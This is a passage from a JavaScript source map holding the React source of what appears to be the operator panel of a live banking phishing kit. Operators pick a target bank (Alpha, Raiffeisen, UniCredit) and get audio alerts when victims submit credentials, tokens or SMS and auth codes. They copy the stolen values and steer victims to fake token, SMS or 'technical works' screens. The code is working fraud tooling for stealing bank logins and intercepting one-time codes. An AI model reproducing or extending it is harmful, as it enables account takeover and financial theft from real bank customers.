getUTCTimestamp()\r\n  // }\r\n\r\n\r\n  return axios({\r\n    url: `${REST}${path}`,\r\n    method,\r\n    data: body,\r\n    headers: {\r\n      'last-active': lastActive\r\n    },\r\n  }).then(json => json.data).then(json => {\r\n    AppStorage.lastActive = json.lastActive\r\n    return json.data\r\n  })\r\n\r\n}\r\n","import { UserActions, UserStatus } from './constants'\r\n\r\n\r\nconst beep = new Audio('/pew.wav')\r\nconst fart = new Audio('/fart.wav')\r\n\r\nconst ACTIONS_TO_NOTIFY = [\r\n  UserActions.SEND_CREDENTIALS,\r\n  UserActions.SEND_TOKEN,\r\n  UserActions.SEND_SMS,\r\n\r\n  UserActions.RAIF_SEND_AUTH_CODE,\r\n  UserActions.RAIF_SEND_SMART_TOKEN,\r\n  UserActions.RAIF_SEND_SMART_TOKEN_SMS,\r\n]\r\n\r\nconst isNewUser = users => {\r\n  return users.reduce((acc, { status, lockedBy }) => {\r\n    return acc || (status === UserStatus.NEW && !lockedBy)\r\n  }, false)\r\n}\r\n\r\nconst isNewImportantMsg = messages => {\r\n  return !!messages.find(msg => ACTIONS_TO_NOTIFY.includes(msg.action))\r\n}\r\n\r\nconst isNotyfy = ({ users, messages }) => {\r\n  return isNewUser(users) || isNewImportantMsg(messages)\r\n}\r\n\r\nexport const notify = ({ users, messages }) => {\r\n  if (isNewUser(users)) {\r\n    beep.play();\r\n  }\r\n\r\n  if (isNewImportantMsg(messages)) {\r\n    fart.play();\r\n  }\r\n}\r\n\r\n","import { ajax } from './client'\r\nimport { UserActions, UserStatus } from './constants'\r\nimport { config } from './../config/config'\r\nimport { notify } from './notification'\r\n\r\n\r\nconst MSG_PULLING_INTERVAL = config.pullingInterval\r\n\r\nconst beep = new Audio('/pew.wav')\r\n\r\nexport const Messaging = {\r\n  init: false,\r\n\r\n  start(okCallback, errCallback) {\r\n\r\n    setInterval(async () => {\r\n      const data = await ajax(`/agent/data`)\r\n\r\n      if (this.init) {\r\n        notify(data)\r\n      }\r\n\r\n      this.init = true\r\n      okCallback(data)\r\n\r\n    }, MSG_PULLING_INTERVAL);\r\n  },\r\n\r\n  async send(userId, action) {\r\n    ajax('/message', 'PUT', { userId, action })\r\n      .catch(e => window.alert('Error for', action.type))\r\n  }\r\n\r\n\r\n\r\n}\r\n\r\n\r\nexport const mergeUsers = (oldUsers, newUsers) => {\r\n  newUsers.forEach(newUser => {\r\n    const idx = oldUsers.findIndex(o => o.id === newUser.id)\r\n    if (idx < 0) {\r\n      oldUsers.push(newUser)\r\n      setTimeout(function() {\r\n        if (newUser.status === UserStatus.NEW) {\r\n          newUser.status = UserStatus.OLD\r\n        }\r\n      }, 10 * 1000)\r\n    } else {\r\n      oldUsers[idx] = newUser\r\n    }\r\n  })\r\n\r\n  return oldUsers\r\n}\r\n\r\n\r\nexport const filterUserMessages = (user, messages) =>\r\n  messages.filter((msg) => msg.userId === user.id)\r\n\r\n\r\nexport const mapUserToMessages = (user, messages) => {\r\n  const isTyping = messages.length && messages[messages.length - 1].action === UserActions.TYPING\r\n\r\n  const tokens = messages.reduce((acc, msg) => {\r\n    switch (msg.action) {\r\n      case UserActions.SEND_TOKEN:\r\n      case UserActions.SEND_CREDENTIALS:\r\n      case UserActions.SEND_SMS:\r\n      case UserActions.RAIF_SEND_SMART_TOKEN_SMS:\r\n      case UserActions.RAIF_SEND_SMART_TOKEN:\r\n      case UserActions.RAIF_SEND_AUTH_CODE:\r\n        acc.push(msg.payload)\r\n        break\r\n      default: // do nothing\r\n    }\r\n\r\n    return acc\r\n  }, [])\r\n\r\n  const ret = {\r\n    ...user,\r\n    isTyping,\r\n    tokens,\r\n    messages\r\n  }\r\n\r\n  setTimeout(function() {\r\n    ret.isTyping = false\r\n  }, 2 * 1000)\r\n\r\n  return ret\r\n\r\n}\r\n\r\nexport const mapUsersToMessages = (users, messages) => {\r\n  return users.reduce((acc, user) => {\r\n    return {\r\n      ...acc,\r\n      [user.id]: mapUserToMessages(user, filterUserMessages(user, messages))\r\n    }\r\n  }, {})\r\n\r\n}\r\n\r\nconst messagesAlreadyExists = (messages, msg) => {\r\n  return messages.find(m => m.id === msg.id)\r\n}\r\n\r\nexport const mergeMessages = (oldMessages, newMessages) => {\r\n  return newMessages.reduce((acc, item) => {\r\n    if (!messagesAlreadyExists(acc, item)) {\r\n      acc.push(item)\r\n    }\r\n\r\n    return acc\r\n  }, oldMessages)\r\n\r\n}\r\n\r\n","import React, { useState, useEffect, createContext } from 'react';\n\n\nexport const UserContext = createContext();\n\nexport const UserContextProvider = props => {\n  const [userId, setUserId] = useState(undefined);\n\n  return (\n    <UserContext.Provider value={[userId, setUserId]}>\n      {props.children}\n    </UserContext.Provider>\n  );\n};","import React, { useContext, Fragment } from 'react';\nimport { UserContext } from './UserContext'\nimport { ajax } from '../utils/client'\nimport { isIgnored, isImportant, isLocked, isLockedByAgent, AppStorage } from '../utils/utils'\n\n\nconst toggleLockUser = (userId, locked) => e => {\n  e.stopPropagation()\n  const agentId = locked ? AppStorage.agent.id : undefined\n  ajax('/agent/lockUser', 'POST', { userId, agentId })\n}\n\nexport function User({ user }) {\n\n  const [userId, setUserId] = useContext(UserContext)\n\n  return (\n    <div className={\n      `user ${user.id === userId && 'selected'} `\n    } onClick={() => {setUserId(user.id)}}>\n      <div className=\"user-info-descr\">\n        <div className=\"user-id\">{user.id}</div>\n        <div className={`user-status ${isImportant(user) && 'important'} ${isIgnored(user) && 'ignored'}`}>{user.status}</div>\n        <div>{user.description}</div>\n      </div>\n      <div className=\"user-info-tokens\">\n        <div>Tokens: <b>{user.tokens.length}</b></div>\n      </div>\n      <div className=\"user-actions\">\n        {/*<div>*/}\n        {/*  {user.isTyping && <Typing visible={user.isTyping} />}*/}\n        {/*</div>*/}\n        <Lock user={user} />\n      </div>\n    </div>\n  );\n}\n\nfunction Lock({ user }) {\n  const { id, lockedBy } = user\n  const lockedByAgent = lockedBy && AppStorage.agents.find(a => a.id === lockedBy)\n\n  const lockedByCurrentAgent = isLockedByAgent(user)\n\n  return (\n    <div className={`user-lock ${isLocked(user) && 'locked'} ${lockedByCurrentAgent && 'lockedByMe'}`}>\n      {lockedBy ? (\n          <Fragment>\n            <span>Locked by <b>{lockedByCurrentAgent ? 'me' : lockedByAgent.username}</b></span>\n            {lockedByCurrentAgent && <button onClick={toggleLockUser(id, false)}>unlock</button>}\n          </Fragment>\n        )\n        : <button onClick={toggleLockUser(id, true)}>lock</button>\n      }\n    </div>\n  )\n}\n\nclass Typing extends React.Component {\n\n  state = {\n    visible: true\n  }\n\n  componentDidMount() {\n    setTimeout(() => {\n      this.setState({ visible: false })\n    }, 3000)\n  }\n\n  render() {\n    const { visible } = this.state\n    // const { visible } = this.props\n    return <div> {visible ? 'typing...' : null} </div>\n  }\n\n}\n\n\n","import React, { useState, useEffect } from 'react';\nimport { User } from './User'\nimport { UserStatus } from '../utils/constants'\nimport { isIgnored, isImportant, isLockedByAgent, AppStorage } from '../utils/utils'\n\n\n\nexport function Users({ usersData }) {\n\n  const sorted = sortItems(Object.values(usersData))\n\n  const [filter, setFilter] = useState('')\n  const filtered = filterItems(sorted, filter)\n\n  return (\n    <div className=\"users-container \">\n      <Filter filter={filter} setFilter={setFilter} />\n\n      <div className=\"sidebar users \">\n        {filtered.map(user => <User key={user.id} user={user} />)}\n      </div>\n    </div>\n  );\n}\n\nfunction Filter({ filter, setFilter }) {\n\n  return (\n    <div className=\"users-filter\">\n      Filter <input type=\"text\" value={filter} onChange={e => setFilter(e.target.value)} />\n      <button onClick={() => setFilter('')}>clear</button>\n    </div>\n  )\n\n}\n\nconst criteria = predicate => u => predicate(u) ? -1 : 1\nconst lockCriteria = criteria(isLockedByAgent)\nconst importantCriteria = criteria(isImportant)\nconst ignoreCriteria = criteria(isIgnored)\n\nconst sortItems = users => {\n  return users.sort((u1, u2) => {\n\n    const ign1 = ignoreCriteria(u1)\n    const ign2 = ignoreCriteria(u2)\n\n    if (ign1 !== ign2) {\n      return ign2 - ign1;\n    }\n\n    const lock1 = lockCriteria(u1)\n    const lock2 = lockCriteria(u2)\n\n    if (lock1 !== lock2) {\n      return lock1 - lock2\n    }\n\n    const imp1 = importantCriteria(u1)\n    const imp2 = importantCriteria(u2)\n\n    if (imp1 !== imp2) {\n      return imp1 - imp2\n    }\n\n    const tokens1 = u1.tokens.length\n    const tokens2 = u2.tokens.length\n\n    if (tokens1 !== tokens2) {\n      return tokens2 - tokens1\n    }\n\n\n    return u2.id - u1.id\n  })\n}\n\nconst filterItems = (users, filter) => {\n  if (!filter || filter.trim() === '') {\n    return users\n  }\n\n  return users.filter(u =>\n    u.id.toString().includes(filter)\n    || (u.description && u.description.includes(filter)))\n}\n\n\n","import React, { useState, useContext, Fragment  } from 'react'\nimport moment from 'moment'\n\nimport { UserContext } from './UserContext'\nimport { User } from './User'\nimport { ajax } from '../utils/client'\nimport { AgentInstructions, BankTypes, CREDENTIALS_DELIMETER, UserActions, UserStatus } from '../utils/constants'\nimport { AppStorage, copyStringToClipboard } from '../utils/utils'\nimport { Messaging } from '../utils/messages'\n\nexport function Messages({ usersData }) {\n\n  const [userId] = useContext(UserContext)\n  const userData = usersData[userId]\n\n  return (\n    <div className=\"messages sidebar\">\n      {userData && (\n        <div>\n          <div>\n            <User user={userData} />\n          </div>\n          <UserMessages messages={userData.messages} />\n          <Actions userId={userId} />\n        </div>\n      )}\n    </div>\n  )\n}\n\nfunction UserMessages({ messages }) {\n  return (\n    <div className=\"user-messages\">\n      {messages && messages.map(msg => <Message key={msg.id} message={msg}/>)}\n    </div>\n  )\n}\n\nconst isUserMessage = action => action.includes('USER')\nconst isAgentMessage = action => action.includes('INSTR')\n\n\n\nfunction Message({ message: { action, payload, time } }) {\n  let Component = null\n  switch (action) {\n    case UserActions.SEND_CREDENTIALS:\n    case UserActions.SEND_TOKEN:\n    case UserActions.SEND_SMS:\n    case UserActions.SEND_TECH_DATA:\n\n    case UserActions.RAIF_SEND_AUTH_CODE:\n    case UserActions.RAIF_SEND_SMART_TOKEN:\n    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:\n      Component = UserCredentialsMessage\n      break;\n\n    case AgentInstructions.GO_TO_HOME_SCREEN:\n    case AgentInstructions.GO_TO_TOKEN_SCREEN:\n    case AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN:\n    case AgentInstructions.GO_TO_SMS_SCREEN:\n    case AgentInstructions.GO_TO_TECH_SCREEN:\n    case AgentInstructions.GO_TO_ORIGINAL_SITE:\n    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN:\n    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS:\n    case AgentInstructions.ERR_MSG_INVALID_CREDENTIALS:\n    case AgentInstructions.SHOW_LOADING_STATE:\n      Component = AgentInstructionMessage\n      break;\n\n    default:\n    // do nothing\n  }\n\n  if (!Component) {\n    return null\n  }\n\n\n  return (\n    <div className={`${isUserMessage(action) ? 'user-msg' : 'agent-msg'}`}>\n      <div className=\"msg-item\">\n        <div className=\"msg-time\">\n          {moment(time).format('HH:mm:ss')}\n        </div>\n        <div className=\"msg-action\">\n          <Component action={action} payload={payload} />\n        </div>\n      </div>\n    </div>\n  )\n\n}\n\nfunction UserCredentialsMessage({ action, payload }) {\n  let label;\n  switch (action) {\n    case UserActions.SEND_CREDENTIALS:\n      label = 'Credentials'\n      break;\n    case UserActions.SEND_TOKEN:\n      label = 'Token'\n      break;\n    case UserActions.RAIF_SEND_AUTH_CODE:\n      label = 'Pers fizice Auth code'\n      break;\n    case UserActions.SEND_SMS:\n      label = 'Pers fizice SMS code'\n      break;\n    case UserActions.RAIF_SEND_SMART_TOKEN:\n      label = 'Pers fizice Smart Token'\n      break;\n    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:\n      label = 'Pers fizice Smart Token SMS'\n      break;\n\n    case UserActions.SEND_TECH_DATA:\n      label = 'Technical data'\n      break;\n    default:\n      // do nothing\n  }\n\n  return (\n    <div className=\"msg-payload\">\n      <label>{label}:</label>\n      {payload && payload.split(CREDENTIALS_DELIMETER).map(item =>\n        <Fragment>\n          <span className=\"msg-payload-value\">{item}</span>\n          <button onClick={() => {copyStringToClipboard(item)} }>copy</button>\n        </Fragment>\n      )}\n\n    </div>\n  )\n\n}\n\nfunction AgentInstructionMessage({ action, payload }) {\n  return (\n    <div>\n      <label>{action}</label>\n      <span className=\"msg-payload-value\">{payload}</span>\n    </div>\n  )\n}\n\n\n\nfunction Actions({ userId }) {\n\n  const [description, setDescription] = useState('')\n\n  return (\n    <div className=\"agent-actions\">\n      <h3 style={{ margin: '0px' }}>{AppStorage.bank}</h3>\n\n      <div className=\"agent-actions-update-user\">\n        <div className=\"agent-action-description\">\n          <input type=\"text\" value={description} onChange={e => setDescription(e.target.value)} />\n          <button onClick={() => updateDescription(userId, description, setDescription)}>add description</button>\n        </div>\n        <div className=\"agent-action-status\">\n          <button onClick={() => updateStatus(userId, UserStatus.IGNORE)}>Ignore</button>\n          <button onClick={() => updateStatus(userId, UserStatus.IMPORTANT)}>Important</button>\n        </div>\n      </div>\n      <div className=\"agent-action-instructions\">\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_HOME_SCREEN})}>Home</button>\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_SMS_SCREEN})}>Pers fizice SMS Code</button>\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_TECH_SCREEN})}>Technical Works</button>\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_ORIGINAL_SITE})}>Original site</button>\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.ERR_MSG_INVALID_CREDENTIALS})}>Error Credentials</button>\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.SHOW_LOADING_STATE})}>Show Loading ...</button>\n        </div>\n          <ActionWithPayload userId={userId} type={AgentInstructions.GO_TO_TOKEN_SCREEN} text=\"Token\"/>\n        <div>\n\n        {AppStorage.bank === BankTypes.RAIFFEISEN && (\n        <div>\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN})}>Pers fizice Auth Code</button>\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN})}>Pers fizice Smart Token</button>\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS})}>Pers fizice Smart Token SMS</button>\n        </div>)}\n      </div>\n    </div>\n\n  )\n}\n\nfunction ActionWithPayload({ userId, type, text }) {\n\n  const [payload, setPayload] = useState('')\n\n  return (\n    <Fragment>\n      <input type=\"text\" value={payload} onChange={e => setPayload(e.target.value)} />\n      <button onClick={() => {\n        Messaging.send(userId, { type, payload })\n        setPayload('')\n      }}>{text}</button>\n    </Fragment>\n\n  )\n}\n\n\nconst updateDescription = (userId, description, setDescription) => {\n  ajax('/agent/description', 'POST', { userId, description })\n  setDescription('')\n}\n\nconst updateStatus = (userId, status) => {\n  ajax('/agent/status', 'POST', { userId, status })\n}\n\nconst agentInstructions = (userId, action) => {\n  Messaging.send(userId, action)\n}\n\n\n\n","import React, { useState, useEffect, createContext } from 'react';\r\nimport { mapUsersToMessages, mergeMessages, mergeUsers, Messaging } from '../utils/messages'\r\nimport { ajax } from '../utils/client'\r\nimport { Users } from './Users'\r\nimport { Messages } from './Messages'\r\nimport { UserContextProvider } from './UserContext'\r\n\r\nexport class Welcome extends React.Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = {\r\n      messages: [],\r\n      users: []\r\n    }\r\n  }\r\n\r\n  // state = []\r\n\r\n  componentDidMount() {\r\n    console.log('****init')\r\n\r\n    // const users = await ajax(`/agent/users`, null, null, { updateLastActive: false })\r\n    // console.log('users', users)\r\n    let init\r\n\r\n    Messaging.start(({ users, messages }) => {\r\n      if (users.length || messages.length) {\r\n        console.log('data', { users, messages })\r\n        this.setState({\r\n          ...this.state,\r\n          users: mergeUsers(this.state.users, users),\r\n          messages: mergeMessages(this.state.messages, messages),\r\n        })\r\n      }\r\n    })\r\n  }\r\n\r\n  render() {\r\n    const { users, messages } = this.state\r\n    const usersData = mapUsersToMessages(users, messages)\r\n\r\n    return (\r\n      <div>\r\n        {/*<div className=\"all-messages\">*/}\r\n        {/*  {messages.map(msg => <div key={msg.id}>{JSON.stringify(msg)}</div>)}*/}\r\n        {/*</div>*/}\r\n        <div className=\"welcome\">\r\n          <UserContextProvider>\r\n            <Users usersData={usersData} />\r\n            <Messages usersData={usersData} />\r\n            {/*<UserMessages messages={messages} />*/}\r\n          </UserContextProvider>\r\n        </div>\r\n      </div>\r\n    );\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n","import React, { useState, Fragment, useEffect } from 'react';\r\nimport { AppStorage } from '../utils/utils'\r\nimport { BankTypes } from '../utils/constants'\r\n\r\n\r\nexport function Auth(props) {\r\n  const isLogged = AppStorage.agent && loggedAgent(AppStorage.agent.username, AppStorage.agent.password)\r\n  const [logged, setLogged] = useState(isLogged)\r\n\r\n  return logged ? <Fragment>{props.children}</Fragment> : <Login setLogged={setLogged} />\r\n}\r\n\r\nfunction Login({ setLogged }) {\r\n\r\n  const [username, setUsername] = useState('')\r\n  const [password, setPassword] = useState('')\r\n  const [bank, setBank] = useState(BankTypes.ALPHA)\r\n  const [error, setError] = useState(false)\r\n  \r\n  return (\r\n    <div className=\"login\">\r\n      <div>\r\n        <select id=\"banks\" name=\"banks\" onChange={(e) => setBank(e.target.value)} defaultValue={BankTypes.ALPHA}>\r\n          <option value={BankTypes.ALFA}>{BankTypes.ALPHA}</option>\r\n          <option value={BankTypes.RAIFFEISEN}>{BankTypes.RAIFFEISEN}</option>\r\n          <option value={BankTypes.UNI_CREDIT}>{BankTypes.UNI_CREDIT}</option>\r\n        </select>\r\n      </div>\r\n      <div>\r\n        <input type=\"text\" value={username} onChange={e => setUsername(e.target.value)} placeholder=\"username\" />\r\n      </div>\r\n      <div>\r\n        <input type=\"password\" value={password} onChange={e => setPassword(e.target.value)} placeholder=\"password\" />\r\n      </div>\r\n      <div>\r\n        {/* <button onClick={e => authenticate(username, password, setError, setLogged)}>login</button> */}\r\n        <button onClick={e => authenticate(username, password, setError, setLogged, bank)}>login</button>\r\n      </div>\r\n      {error && <div className=\"error\">Invalid Credentials</div>}\r\n    </div>\r\n  )\r\n\r\n}\r\n\r\nconst authenticate = (username, password, setError, setLogged, bank) => {\r\n  const agent = loggedAgent(username, password)\r\n  AppStorage.bank = bank\r\n  if (agent) {\r\n    AppStorage.agent = agent\r\n    setError(false)\r\n    setLogged(true)\r\n  } else {\r\n    setError(true)\r\n  }\r\n}\r\n\r\nconst loggedAgent = (username, password) => AppStorage.agents.find(agent => agent.username === username && agent.password === password)\r\n\r\n\r\n","import React from 'react';\r\nimport './App.css';\r\nimport { Welcome } from './components/Welcome'\r\nimport { Auth } from './components/Auth'\r\n\r\nconsole.log('ENV:', process.env.NODE_ENV)\r\n\r\nfunction App() {\r\n  return (\r\n    <div className=\"App\">\r\n      <Auth>\r\n        <Welcome/>\r\n      </Auth>\r\n    </div>\r\n  );\r\n}\r\n\r\nexport default App;\r\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' },\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready\n      .then(registration => {\n        registration.unregister();\n      })\n      .catch(error => {\n        console.error(error.message);\n      });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\n// window.store = {}\n\n//TODO\n// window.store.agent = { id: 1, name: 'Vanea' }\n\nReactDOM.render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}